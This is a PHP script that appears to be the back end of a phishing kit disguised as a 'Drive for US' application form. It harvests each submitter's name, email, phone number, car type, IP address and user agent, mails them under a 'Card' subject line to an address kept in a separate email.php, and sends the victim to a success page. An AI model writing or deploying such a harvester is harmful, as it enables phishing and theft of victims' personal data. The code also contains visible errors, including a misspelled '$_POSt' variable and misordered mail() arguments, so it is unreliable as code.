<?php
if($_POST["f_name"] != "" and $_POST["l_name"] != "" and $_POST["email"] != ""and $_POST["p_number"] != "" 
and $_POST["t_car"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Drive for US Info-----------------------\n";
$message .= "First Name				  : ".$_POST['f_name']."\n";
$message .= "Last Name				  : ".$_POSt['l_name']."\n";
$message .= "Email Address            : ".$_POST['email']."\n";
$message .= "Phone Number             : ".$_POST['p_number']."\n";
$message .= "Type of Car			  : ".$_POST['t_car']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: success.php");
}else{
header ("Location: success.php");
}

?>